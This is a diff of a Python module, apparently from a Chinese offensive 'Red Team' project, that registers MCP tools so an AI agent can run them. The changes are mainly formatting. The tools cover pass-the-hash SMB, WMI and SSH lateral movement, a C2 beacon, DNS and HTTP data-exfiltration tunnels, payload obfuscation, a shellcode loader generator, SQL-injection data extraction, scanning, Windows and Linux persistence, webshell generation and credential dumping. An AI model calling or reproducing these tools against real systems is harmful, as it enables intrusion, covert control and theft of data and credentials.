@@ -7,7 +7,7 @@ Red Team 高级工具 MCP 集成
 
 import json
 import logging
-from typing import Optional, Dict, Any, List
+from typing import Any, Dict, List, Optional
 
 from utils.mcp_tooling import patch_mcp_tool
 
@@ -30,7 +30,7 @@ def register_redteam_tools(mcp):
         ntlm_hash: str = "",
         command: str = "whoami",
         domain: str = "",
-        method: str = "smbexec"
+        method: str = "smbexec",
     ) -> str:
         """SMB横向移动 - Pass-the-Hash/密码执行远程命令
 
@@ -56,22 +56,21 @@ def register_redteam_tools(mcp):
                 command=command,
                 domain=domain,
                 ntlm_hash=ntlm_hash if ntlm_hash else None,
-                method=method
+                method=method,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except ImportError as e:
-            return json.dumps({
-                "success": False,
-                "error": f"模块导入失败: {e}",
-                "hint": "需要安装 impacket: pip install impacket"
-            })
+            return json.dumps(
+                {
+                    "success": False,
+                    "error": f"模块导入失败: {e}",
+                    "hint": "需要安装 impacket: pip install impacket",
+                }
+            )
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("lateral_smb_exec")
 
@@ -83,7 +82,7 @@ def register_redteam_tools(mcp):
         local_file: str,
         remote_path: str,
         share: str = "C$",
-        domain: str = ""
+        domain: str = "",
     ) -> str:
         """SMB文件上传 - 上传文件到远程主机
 
@@ -109,16 +108,13 @@ def register_redteam_tools(mcp):
                 local_file=local_file,
                 remote_path=remote_path,
                 share=share,
-                domain=domain
+                domain=domain,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("lateral_smb_upload")
 
@@ -129,7 +125,7 @@ def register_redteam_tools(mcp):
         password: str = "",
         key_file: str = "",
         command: str = "id",
-        port: int = 22
+        port: int = 22,
     ) -> str:
         """SSH横向移动 - 密码/密钥执行远程命令
 
@@ -153,22 +149,21 @@ def register_redteam_tools(mcp):
                 password=password,
                 command=command,
                 port=port,
-                key_file=key_file if key_file else None
+                key_file=key_file if key_file else None,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except ImportError as e:
-            return json.dumps({
-                "success": False,
-                "error": f"模块导入失败: {e}",
-                "hint": "需要安装 paramiko: pip install paramiko"
-            })
+            return json.dumps(
+                {
+                    "success": False,
+                    "error": f"模块导入失败: {e}",
+                    "hint": "需要安装 paramiko: pip install paramiko",
+                }
+            )
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("lateral_ssh_exec")
 
@@ -181,7 +176,7 @@ def register_redteam_tools(mcp):
         local_port: int = 8080,
         remote_host: str = "127.0.0.1",
         remote_port: int = 80,
-        port: int = 22
+        port: int = 22,
     ) -> str:
         """SSH隧道 - 创建端口转发隧道
 
@@ -209,16 +204,13 @@ def register_redteam_tools(mcp):
                 local_port=local_port,
                 remote_host=remote_host,
                 remote_port=remote_port,
-                port=port
+                port=port,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("lateral_ssh_tunnel")
 
@@ -229,7 +221,7 @@ def register_redteam_tools(mcp):
         password: str,
         command: str = "whoami",
         domain: str = "",
-        get_output: bool = False
+        get_output: bool = False,
     ) -> str:
         """WMI横向移动 - Windows远程命令执行
 
@@ -253,22 +245,21 @@ def register_redteam_tools(mcp):
                 password=password,
                 command=command,
                 domain=domain,
-                get_output=get_output
+                get_output=get_output,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except ImportError as e:
-            return json.dumps({
-                "success": False,
-                "error": f"模块导入失败: {e}",
-                "hint": "需要安装 impacket: pip install impacket"
-            })
+            return json.dumps(
+                {
+                    "success": False,
+                    "error": f"模块导入失败: {e}",
+                    "hint": "需要安装 impacket: pip install impacket",
+                }
+            )
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("lateral_wmi_exec")
 
@@ -278,7 +269,7 @@ def register_redteam_tools(mcp):
         username: str,
         password: str,
         query: str = "SELECT * FROM Win32_OperatingSystem",
-        domain: str = ""
+        domain: str = "",
     ) -> str:
         """WMI查询 - 远程系统信息收集
 
@@ -303,20 +294,13 @@ def register_redteam_tools(mcp):
             from core.lateral import wmi_query
 
             result = wmi_query(
-                target=target,
-                username=username,
-                password=password,
-                wql=query,
-                domain=domain
+                target=target, username=username, password=password, wql=query, domain=domain
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("lateral_wmi_query")
 
@@ -324,10 +308,7 @@ def register_redteam_tools(mcp):
 
     @mcp.tool()
     def c2_beacon_start(
-        server_url: str,
-        interval: int = 30,
-        jitter: float = 0.2,
-        use_https: bool = True
+        server_url: str, interval: int = 30, jitter: float = 0.2, use_https: bool = True
     ) -> str:
         """启动C2 Beacon客户端 - 建立命令控制通道
 
@@ -341,41 +322,33 @@ def register_redteam_tools(mcp):
             JSON格式Beacon信息
         """
         try:
-            from core.c2 import create_beacon, BeaconConfig
+            from core.c2 import BeaconConfig, create_beacon
 
             config = BeaconConfig(
-                server_url=server_url,
-                interval=interval,
-                jitter=jitter,
-                use_https=use_https
+                server_url=server_url, interval=interval, jitter=jitter, use_https=use_https
             )
 
             beacon = create_beacon(config)
 
-            return json.dumps({
-                "success": True,
-                "beacon_id": beacon.beacon_id,
-                "server": server_url,
-                "interval": interval,
-                "jitter": jitter,
-                "status": "initialized"
-            }, indent=2)
+            return json.dumps(
+                {
+                    "success": True,
+                    "beacon_id": beacon.beacon_id,
+                    "server": server_url,
+                    "interval": interval,
+                    "jitter": jitter,
+                    "status": "initialized",
+                },
+                indent=2,
+            )
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("c2_beacon_start")
 
     @mcp.tool()
-    def c2_dns_tunnel(
-        domain: str,
-        data: str,
-        xor_key: str = "",
-        chunk_size: int = 30
-    ) -> str:
+    def c2_dns_tunnel(domain: str, data: str, xor_key: str = "", chunk_size: int = 30) -> str:
         """DNS隧道数据外传 - 通过DNS查询传输数据
 
         Args:
@@ -393,29 +366,24 @@ def register_redteam_tools(mcp):
             tunnel = DNSTunnel(domain, xor_key=xor_key if xor_key else None)
             result = tunnel.send_data(data.encode(), chunk_size=chunk_size)
 
-            return json.dumps({
-                "success": True,
-                "domain": domain,
-                "data_size": len(data),
-                "chunks_sent": result.get("chunks_sent", 0),
-                "method": "DNS TXT query"
-            }, indent=2)
+            return json.dumps(
+                {
+                    "success": True,
+                    "domain": domain,
+                    "data_size": len(data),
+                    "chunks_sent": result.get("chunks_sent", 0),
+                    "method": "DNS TXT query",
+                },
+                indent=2,
+            )
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("c2_dns_tunnel")
 
     @mcp.tool()
-    def c2_http_tunnel(
-        url: str,
-        data: str,
-        method: str = "body",
-        xor_key: str = ""
-    ) -> str:
+    def c2_http_tunnel(url: str, data: str, method: str = "body", xor_key: str = "") -> str:
         """HTTP隧道数据外传 - 通过HTTP请求传输数据
 
         Args:
@@ -431,24 +399,21 @@ def register_redteam_tools(mcp):
             from core.c2 import HTTPTunnel
 
             tunnel = HTTPTunnel(url, xor_key=xor_key if xor_key else None)
-            result = tunnel.send_data(
-                data.encode(),
-                method=method
+            result = tunnel.send_data(data.encode(), method=method)
+
+            return json.dumps(
+                {
+                    "success": True,
+                    "url": url,
+                    "data_size": len(data),
+                    "method": method,
+                    "status": result.get("status", "sent"),
+                },
+                indent=2,
             )
 
-            return json.dumps({
-                "success": True,
-                "url": url,
-                "data_size": len(data),
-                "method": method,
-                "status": result.get("status", "sent")
-            }, indent=2)
-
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("c2_http_tunnel")
 
@@ -456,10 +421,7 @@ def register_redteam_tools(mcp):
 
     @mcp.tool()
     def evasion_obfuscate_payload(
-        payload: str,
-        encoding: str = "xor",
-        key: str = "",
-        multilayer: bool = False
+        payload: str, encoding: str = "xor", key: str = "", multilayer: bool = False
     ) -> str:
         """Payload混淆 - 编码/加密Payload绕过检测
 
@@ -476,19 +438,13 @@ def register_redteam_tools(mcp):
             from core.evasion import obfuscate_payload
 
             result = obfuscate_payload(
-                payload=payload,
-                encoding=encoding,
-                key=key,
-                multilayer=multilayer
+                payload=payload, encoding=encoding, key=key, multilayer=multilayer
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("evasion_obfuscate_payload")
 
@@ -498,7 +454,7 @@ def register_redteam_tools(mcp):
         rename_vars: bool = True,
         add_junk: bool = True,
         obfuscate_strings: bool = True,
-        compress: bool = False
+        compress: bool = False,
     ) -> str:
         """Python代码混淆 - 变量重命名/字符串编码/垃圾代码
 
@@ -520,24 +476,19 @@ def register_redteam_tools(mcp):
                 rename_vars=rename_vars,
                 add_junk=add_junk,
                 obfuscate_strings=obfuscate_strings,
-                compress=compress
+                compress=compress,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("evasion_obfuscate_python")
 
     @mcp.tool()
     def evasion_shellcode_loader(
-        shellcode_hex: str,
-        xor_encrypt: bool = True,
-        platform: str = "windows"
+        shellcode_hex: str, xor_encrypt: bool = True, platform: str = "windows"
     ) -> str:
         """Shellcode加载器生成 - 生成Python加载器代码
 
@@ -553,18 +504,13 @@ def register_redteam_tools(mcp):
             from core.evasion import generate_shellcode_loader
 
             result = generate_shellcode_loader(
-                shellcode_hex=shellcode_hex,
-                xor_encrypt=xor_encrypt,
-                platform=platform
+                shellcode_hex=shellcode_hex, xor_encrypt=xor_encrypt, platform=platform
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("evasion_shellcode_loader")
 
@@ -577,7 +523,7 @@ def register_redteam_tools(mcp):
         humanize: bool = True,
         spoof_fingerprint: bool = True,
         browser: str = "chrome",
-        proxy: str = ""
+        proxy: str = "",
     ) -> str:
         """隐蔽HTTP请求 - 模拟真实浏览器行为
 
@@ -594,11 +540,13 @@ def register_redteam_tools(mcp):
         """
         try:
             import requests
-            from core.stealth import TrafficMutator, FingerprintSpoofer, BrowserType
+
+            from core.stealth import BrowserType, FingerprintSpoofer, TrafficMutator
 
             # 创建Session - 优先使用统一 HTTP 客户端工厂
             try:
                 from core.http import get_sync_client
+
                 session = get_sync_client(proxy=proxy, force_new=True)
             except ImportError:
                 session = requests.Session()
@@ -609,7 +557,7 @@ def register_redteam_tools(mcp):
                     "chrome": BrowserType.CHROME,
                     "firefox": BrowserType.FIREFOX,
                     "safari": BrowserType.SAFARI,
-                    "edge": BrowserType.EDGE
+                    "edge": BrowserType.EDGE,
                 }
                 spoofer = FingerprintSpoofer()
                 browser_type = browser_map.get(browser.lower(), BrowserType.CHROME)
@@ -620,8 +568,9 @@ def register_redteam_tools(mcp):
             if humanize:
                 mutator = TrafficMutator()
                 # 添加随机延迟
-                import time
                 import random
+                import time
+
                 time.sleep(random.uniform(0.5, 2.0))
 
             # 设置代理
@@ -635,32 +584,29 @@ def register_redteam_tools(mcp):
                 url=url,
                 proxies=proxies if proxies else None,
                 timeout=15,
-                verify=False
+                verify=False,
             )
 
-            return json.dumps({
-                "success": True,
-                "url": url,
-                "status_code": resp.status_code,
-                "headers": dict(resp.headers),
-                "content_length": len(resp.content),
-                "browser_emulated": browser
-            }, indent=2, ensure_ascii=False)
+            return json.dumps(
+                {
+                    "success": True,
+                    "url": url,
+                    "status_code": resp.status_code,
+                    "headers": dict(resp.headers),
+                    "content_length": len(resp.content),
+                    "browser_emulated": browser,
+                },
+                indent=2,
+                ensure_ascii=False,
+            )
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("stealth_request")
 
     @mcp.tool()
-    def stealth_proxy_pool(
-        action: str = "list",
-        proxy: str = "",
-        proxy_type: str = "http"
-    ) -> str:
+    def stealth_proxy_pool(action: str = "list", proxy: str = "", proxy_type: str = "http") -> str:
         """代理池管理 - 添加/验证/获取代理
 
         Args:
@@ -672,7 +618,7 @@ def register_redteam_tools(mcp):
             JSON格式结果
         """
         try:
-            from core.stealth import ProxyPool, Proxy
+            from core.stealth import Proxy, ProxyPool
 
             pool = ProxyPool()
 
@@ -682,68 +628,53 @@ def register_redteam_tools(mcp):
                 p = Proxy(
                     host=proxy.split(":")[0],
                     port=int(proxy.split(":")[1]) if ":" in proxy else 8080,
-                    type=proxy_type
+                    type=proxy_type,
                 )
                 pool.add_proxy(p)
-                return json.dumps({
-                    "success": True,
-                    "action": "added",
-                    "proxy": proxy
-                })
+                return json.dumps({"success": True, "action": "added", "proxy": proxy})
 
             elif action == "get":
                 p = pool.get_proxy()
                 if p:
-                    return json.dumps({
-                        "success": True,
-                        "proxy": f"{p.host}:{p.port}",
-                        "type": p.type
-                    })
+                    return json.dumps(
+                        {"success": True, "proxy": f"{p.host}:{p.port}", "type": p.type}
+                    )
                 return json.dumps({"success": False, "error": "代理池为空"})
 
             elif action == "list":
                 proxies = pool.list_proxies()
-                return json.dumps({
-                    "success": True,
-                    "count": len(proxies),
-                    "proxies": proxies
-                }, indent=2)
+                return json.dumps(
+                    {"success": True, "count": len(proxies), "proxies": proxies}, indent=2
+                )
 
             elif action == "validate":
                 if not proxy:
                     return json.dumps({"success": False, "error": "需要提供proxy参数"})
                 # 简单验证
                 import requests
+
                 try:
                     resp = requests.get(
                         "http://httpbin.org/ip",
                         proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
-                        timeout=10
+                        timeout=10,
                     )
-                    return json.dumps({
-                        "success": True,
-                        "proxy": proxy,
-                        "valid": resp.status_code == 200,
-                        "external_ip": resp.json().get("origin", "unknown")
-                    })
+                    return json.dumps(
+                        {
+                            "success": True,
+                            "proxy": proxy,
+                            "valid": resp.status_code == 200,
+                            "external_ip": resp.json().get("origin", "unknown"),
+                        }
+                    )
                 except Exception:
-                    return json.dumps({
-                        "success": True,
-                        "proxy": proxy,
-                        "valid": False
-                    })
+                    return json.dumps({"success": True, "proxy": proxy, "valid": False})
 
             else:
-                return json.dumps({
-                    "success": False,
-                    "error": f"未知操作: {action}"
-                })
+                return json.dumps({"success": False, "error": f"未知操作: {action}"})
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("stealth_proxy_pool")
 
@@ -751,11 +682,7 @@ def register_redteam_tools(mcp):
 
     @mcp.tool()
     def exploit_sqli_detect(
-        url: str,
-        param: str = "",
-        method: str = "GET",
-        data: str = "",
-        cookie: str = ""
+        url: str, param: str = "", method: str = "GET", data: str = "", cookie: str = ""
     ) -> str:
         """纯Python SQL注入检测 - 无需sqlmap
 
@@ -777,26 +704,19 @@ def register_redteam_tools(mcp):
                 param=param if param else None,
                 method=method,
                 data=json.loads(data) if data else None,
-                cookies=cookie if cookie else None
+                cookies=cookie if cookie else None,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("exploit_sqli_detect")
 
     @mcp.tool()
     def exploit_sqli_extract(
-        url: str,
-        param: str,
-        db_type: str = "mysql",
-        extract: str = "database",
-        method: str = "GET"
+        url: str, param: str, db_type: str = "mysql", extract: str = "database", method: str = "GET"
     ) -> str:
         """SQL注入数据提取 - 获取数据库信息
 
@@ -811,14 +731,14 @@ def register_redteam_tools(mcp):
             JSON格式提取结果
         """
         try:
-            from core.exploit import exploit_sqli, DBType
+            from core.exploit import DBType, exploit_sqli
 
             db_map = {
                 "mysql": DBType.MYSQL,
                 "postgresql": DBType.POSTGRESQL,
                 "mssql": DBType.MSSQL,
                 "oracle": DBType.ORACLE,
-                "sqlite": DBType.SQLITE
+                "sqlite": DBType.SQLITE,
             }
 
             result = exploit_sqli(
@@ -826,25 +746,19 @@ def register_redteam_tools(mcp):
                 param=param,
                 db_type=db_map.get(db_type.lower(), DBType.MYSQL),
                 extract=extract,
-                method=method
+                method=method,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("exploit_sqli_extract")
 
     @mcp.tool()
     def exploit_port_scan(
-        target: str,
-        ports: str = "top100",
-        timeout: float = 1.0,
-        threads: int = 100
+        target: str, ports: str = "top100", timeout: float = 1.0, threads: int = 100
     ) -> str:
         """纯Python端口扫描 - 无需nmap
 
@@ -860,28 +774,17 @@ def register_redteam_tools(mcp):
         try:
             from core.exploit import scan_ports
 
-            result = scan_ports(
-                target=target,
-                ports=ports,
-                timeout=timeout,
-                max_threads=threads
-            )
+            result = scan_ports(target=target, ports=ports, timeout=timeout, max_threads=threads)
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("exploit_port_scan")
 
     @mcp.tool()
-    def exploit_service_detect(
-        target: str,
-        port: int
-    ) -> str:
+    def exploit_service_detect(target: str, port: int) -> str:
         """服务指纹识别 - 识别端口运行的服务
 
         Args:
@@ -897,26 +800,20 @@ def register_redteam_tools(mcp):
             scanner = PurePortScanner(target)
             result = scanner.detect_service(port)
 
-            return json.dumps({
-                "success": True,
-                "target": target,
-                "port": port,
-                "service": result
-            }, indent=2, ensure_ascii=False)
+            return json.dumps(
+                {"success": True, "target": target, "port": port, "service": result},
+                indent=2,
+                ensure_ascii=False,
+            )
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("exploit_service_detect")
 
     @mcp.tool()
     def exploit_network_scan(
-        network: str,
-        ports: str = "22,80,443,3389",
-        timeout: float = 0.5
+        network: str, ports: str = "22,80,443,3389", timeout: float = 0.5
     ) -> str:
         """网络扫描 - 发现存活主机和开放端口
 
@@ -931,19 +828,12 @@ def register_redteam_tools(mcp):
         try:
             from core.exploit import scan_network
 
-            result = scan_network(
-                network=network,
-                ports=ports,
-                timeout=timeout
-            )
+            result = scan_network(network=network, ports=ports, timeout=timeout)
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("exploit_network_scan")
 
@@ -951,10 +841,7 @@ def register_redteam_tools(mcp):
 
     @mcp.tool()
     def redteam_recon(
-        target: str,
-        scan_ports: bool = True,
-        detect_waf: bool = True,
-        stealth: bool = True
+        target: str, scan_ports: bool = True, detect_waf: bool = True, stealth: bool = True
     ) -> str:
         """Red Team侦察 - 综合信息收集
 
@@ -968,15 +855,13 @@ def register_redteam_tools(mcp):
             JSON格式侦察结果
         """
         try:
-            results = {
-                "target": target,
-                "recon": {}
-            }
+            results = {"target": target, "recon": {}}
 
             # 端口扫描
             if scan_ports:
                 try:
                     from core.exploit import quick_scan
+
                     port_result = quick_scan(target)
                     results["recon"]["ports"] = port_result
                 except Exception as e:
@@ -986,19 +871,16 @@ def register_redteam_tools(mcp):
             if detect_waf:
                 try:
                     import requests
+
                     headers = {}
                     if stealth:
-                        from core.stealth import FingerprintSpoofer, BrowserType
+                        from core.stealth import BrowserType, FingerprintSpoofer
+
                         spoofer = FingerprintSpoofer()
                         headers = spoofer.get_headers(BrowserType.CHROME)
 
                     url = target if target.startswith("http") else f"http://{target}"
-                    resp = requests.get(
-                        url,
-                        headers=headers,
-                        timeout=10,
-                        verify=False
-                    )
+                    resp = requests.get(url, headers=headers, timeout=10, verify=False)
 
                     waf_indicators = {
                         "cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
@@ -1021,7 +903,7 @@ def register_redteam_tools(mcp):
 
                     results["recon"]["waf"] = {
                         "detected": detected_waf is not None,
-                        "type": detected_waf
+                        "type": detected_waf,
                     }
 
                 except Exception as e:
@@ -1031,20 +913,13 @@ def register_redteam_tools(mcp):
             return json.dumps(results, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("redteam_recon")
 
     @mcp.tool()
     def redteam_lateral_chain(
-        targets: str,
-        username: str,
-        password: str,
-        command: str = "whoami",
-        method: str = "auto"
+        targets: str, username: str, password: str, command: str = "whoami", method: str = "auto"
     ) -> str:
         """横向移动链 - 批量执行命令
 
@@ -1060,11 +935,7 @@ def register_redteam_tools(mcp):
         """
         try:
             target_list = [t.strip() for t in targets.split(",") if t.strip()]
-            results = {
-                "success": True,
-                "total": len(target_list),
-                "results": []
-            }
+            results = {"success": True, "total": len(target_list), "results": []}
 
             for target in target_list:
                 try:
@@ -1073,6 +944,7 @@ def register_redteam_tools(mcp):
                     if method == "ssh" or (method == "auto" and ":" not in target):
                         # SSH
                         from core.lateral import ssh_exec
+
                         exec_result = ssh_exec(target, username, password, command)
                         result["method"] = "ssh"
                         result["output"] = exec_result
@@ -1080,6 +952,7 @@ def register_redteam_tools(mcp):
                     elif method == "wmi" or method == "auto":
                         # WMI
                         from core.lateral import wmi_exec
+
                         exec_result = wmi_exec(target, username, password, command)
                         result["method"] = "wmi"
                         result["output"] = exec_result
@@ -1087,6 +960,7 @@ def register_redteam_tools(mcp):
                     else:
                         # SMB
                         from core.lateral import smb_exec
+
                         exec_result = smb_exec(target, username, password, command)
                         result["method"] = "smb"
                         result["output"] = exec_result
@@ -1094,18 +968,12 @@ def register_redteam_tools(mcp):
                     results["results"].append(result)
 
                 except Exception as e:
-                    results["results"].append({
-                        "target": target,
-                        "error": str(e)
-                    })
+                    results["results"].append({"target": target, "error": str(e)})
 
             return json.dumps(results, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("redteam_lateral_chain")
 
@@ -1113,10 +981,7 @@ def register_redteam_tools(mcp):
 
     @mcp.tool()
     def persistence_windows(
-        payload_path: str,
-        method: str = "registry",
-        name: str = "",
-        hidden: bool = True
+        payload_path: str, method: str = "registry", name: str = "", hidden: bool = True
     ) -> str:
         """Windows持久化 - 多种持久化技术
 
@@ -1132,34 +997,22 @@ def register_redteam_tools(mcp):
         try:
             from core.persistence import windows_persist
 
-            result = windows_persist(
-                payload_path=payload_path,
-                method=method,
-                name=name
-            )
+            result = windows_persist(payload_path=payload_path, method=method, name=name)
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except ImportError as e:
-            return json.dumps({
-                "success": False,
-                "error": f"模块导入失败: {e}",
-                "hint": "仅支持Windows平台"
-            })
+            return json.dumps(
+                {"success": False, "error": f"模块导入失败: {e}", "hint": "仅支持Windows平台"}
+            )
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("persistence_windows")
 
     @mcp.tool()
     def persistence_linux(
-        command: str,
-        method: str = "crontab",
-        user: str = "",
-        hidden: bool = True
+        command: str, method: str = "crontab", user: str = "", hidden: bool = True
     ) -> str:
         """Linux持久化 - 多种持久化技术
 
@@ -1187,31 +1040,28 @@ def register_redteam_tools(mcp):
                 result = persistence.profile(command, user=user)
             elif method == "ssh":
                 # SSH需要公钥
-                return json.dumps({
-                    "success": False,
-                    "error": "SSH方式请使用persistence_ssh_key工具"
-                })
+                return json.dumps(
+                    {"success": False, "error": "SSH方式请使用persistence_ssh_key工具"}
+                )
             elif method == "init_d":
                 result = persistence.init_d(command)
             elif method == "rc_local":
                 result = persistence.rc_local(command)
             else:
-                return json.dumps({
-                    "success": False,
-                    "error": f"未知方法: {method}"
-                })
+                return json.dumps({"success": False, "error": f"未知方法: {method}"})
 
-            return json.dumps({
-                "success": result.success,
-                "method": method,
-                "details": result.details if hasattr(result, 'details') else str(result)
-            }, indent=2, ensure_ascii=False)
+            return json.dumps(
+                {
+                    "success": result.success,
+                    "method": method,
+                    "details": result.details if hasattr(result, "details") else str(result),
+                },
+                indent=2,
+                ensure_ascii=False,
+            )
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("persistence_linux")
 
@@ -1220,7 +1070,7 @@ def register_redteam_tools(mcp):
         shell_type: str = "php",
         password: str = "",
         obfuscation: str = "none",
-        tool_compatible: str = ""
+        tool_compatible: str = "",
     ) -> str:
         """Webshell生成 - 多种类型和兼容工具
 
@@ -1234,13 +1084,13 @@ def register_redteam_tools(mcp):
             JSON格式包含Shell代码
         """
         try:
-            from core.persistence import WebshellGenerator, ObfuscationLevel
+            from core.persistence import ObfuscationLevel, WebshellGenerator
 
             obf_map = {
                 "none": ObfuscationLevel.NONE,
                 "low": ObfuscationLevel.LOW,
                 "medium": ObfuscationLevel.MEDIUM,
-                "high": ObfuscationLevel.HIGH
+                "high": ObfuscationLevel.HIGH,
             }
 
             generator = WebshellGenerator()
@@ -1251,8 +1101,7 @@ def register_redteam_tools(mcp):
                 result = generator.godzilla_shell(password=password)
             elif shell_type == "php":
                 result = generator.php_shell(
-                    password=password,
-                    obfuscation=obf_map.get(obfuscation, ObfuscationLevel.NONE)
+                    password=password, obfuscation=obf_map.get(obfuscation, ObfuscationLevel.NONE)
                 )
             elif shell_type == "jsp":
                 result = generator.jsp_shell(password=password)
@@ -1261,34 +1110,33 @@ def register_redteam_tools(mcp):
             elif shell_type == "python":
                 result = generator.python_shell(password=password)
             else:
-                return json.dumps({
-                    "success": False,
-                    "error": f"未知Shell类型: {shell_type}"
-                })
+                return json.dumps({"success": False, "error": f"未知Shell类型: {shell_type}"})
 
-            return json.dumps({
-                "success": True,
-                "type": result.shell_type.value if hasattr(result.shell_type, 'value') else shell_type,
-                "password": result.password,
-                "code": result.code,
-                "usage": result.usage
-            }, indent=2, ensure_ascii=False)
+            return json.dumps(
+                {
+                    "success": True,
+                    "type": (
+                        result.shell_type.value
+                        if hasattr(result.shell_type, "value")
+                        else shell_type
+                    ),
+                    "password": result.password,
+                    "code": result.code,
+                    "usage": result.usage,
+                },
+                indent=2,
+                ensure_ascii=False,
+            )
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("persistence_webshell")
 
     # ==================== 凭证收集工具 ====================
 
     @mcp.tool()
-    def credential_dump(
-        categories: str = "all",
-        verbose: bool = False
-    ) -> str:
+    def credential_dump(categories: str = "all", verbose: bool = False) -> str:
         """凭证提取 - 提取系统保存的凭证
 
         Args:
@@ -1316,18 +1164,13 @@ def register_redteam_tools(mcp):
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("credential_dump")
 
     @mcp.tool()
     def credential_find_secrets(
-        path: str,
-        recursive: bool = True,
-        include_git: bool = False
+        path: str, recursive: bool = True, include_git: bool = False
     ) -> str:
         """敏感信息搜索 - 搜索文件中的密码/密钥/Token
 
@@ -1351,19 +1194,13 @@ def register_redteam_tools(mcp):
             from core.credential import find_secrets
 
             result = find_secrets(
-                path=path,
-                recursive=recursive,
-                include_git=include_git,
-                verbose=False
+                path=path, recursive=recursive, include_git=include_git, verbose=False
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("credential_find_secrets")
 
@@ -1371,11 +1208,7 @@ def register_redteam_tools(mcp):
 
     @mcp.tool()
     def ad_enumerate(
-        domain: str,
-        dc_ip: str = "",
-        username: str = "",
-        password: str = "",
-        enum_type: str = "all"
+        domain: str, dc_ip: str = "", username: str = "", password: str = "", enum_type: str = "all"
     ) -> str:
         """AD域枚举 - LDAP查询域信息
 
@@ -1398,26 +1231,19 @@ def register_redteam_tools(mcp):
                 username=username,
                 password=password,
                 enum_type=enum_type,
-                verbose=False
+                verbose=False,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("ad_enumerate")
 
     @mcp.tool()
